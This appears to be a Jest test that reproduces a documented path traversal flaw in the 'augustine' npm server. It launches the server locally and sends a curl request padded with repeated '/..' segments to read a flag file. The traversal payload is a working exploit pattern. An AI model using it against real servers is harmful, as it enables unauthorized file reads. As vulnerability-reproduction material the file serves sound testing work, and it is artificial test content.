//https://hackerone.com/reports/296282
const path = require("path");
const pathToFlag = path.resolve(__dirname, "../flag.html");

function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}

test("Path Traversal in augustine", (done) => {
  const fs = require("fs");
  const sleep = require("sleep");
  const { exec } = require("child_process");
  let hostsFile = fs.readFileSync(pathToFlag).toString();

  let server = "node ./node_modules/augustine/bin/augustine.js -p 8968"; //to start the server
  exec(server, (error, stdout) => {}); //starting the server

  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8968${genstr()}"`;

  exec(attack_string, (error, stdout) => {
    //attack
    expect(stdout).toBe(hostsFile);
    done();
  });
});
